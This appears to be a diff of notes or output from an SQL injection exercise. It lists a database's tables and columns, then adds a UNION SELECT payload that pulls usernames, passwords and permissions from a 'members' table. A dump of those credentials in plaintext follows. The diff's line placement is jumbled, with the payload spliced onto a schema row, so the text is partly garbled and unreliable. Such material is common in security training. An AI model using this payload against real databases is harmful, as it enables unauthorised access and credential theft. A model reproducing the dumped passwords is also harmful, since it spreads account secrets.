@@ -61,7 +61,7 @@ permissions	level	3.00
 permissions	name	3.00
 permissions	description	3.00
 
-products	id	3.00
+products	id	3.00union select username,password,permission from members#
 products	name	3.00
 products	description	3.00
 products	price	3.00
@@ -74,7 +74,7 @@ share4	mime	3.00
 share4	data	3.00
 
 
-union select username,password,permission from members#
+product=1&Submit=Submit
 ## username, password, permission
 Boss	CdOETQHZoOD0hPvReTMr	1.00
 Maverick	turn&burn	3.00
